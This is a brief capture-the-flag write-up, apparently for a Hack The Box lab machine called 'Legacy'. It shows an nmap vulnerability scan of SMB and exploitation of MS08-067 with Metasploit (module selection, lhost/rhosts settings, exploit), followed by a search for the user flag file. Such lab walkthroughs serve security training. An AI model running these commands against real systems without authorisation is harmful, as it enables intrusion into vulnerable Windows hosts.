# 🦵 Legacy

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We start with a quick scan ->

i have these ports:&#x20;

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
nmap -p 445 --script vuln  10.129.29.238
```

**--script vuln:** Checks for specific known vulnerabilities and generally only report results if they are found

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>CVE-2008-4250</p></figcaption></figure>

i run msfconsole ->

```
search ms08-067
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
use 0
options
set lhost 10.10.14.166
set rhosts 10.129.29.238
exploit
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

there is a lot of file so let's look for the file we're interested in :

```bash
search -f user.txt
c:\Documents and Settings\john\Desktop\user.txt
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and for some reason the root file was not protected by any privesc...

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (700).png" alt=""><figcaption></figcaption></figure>
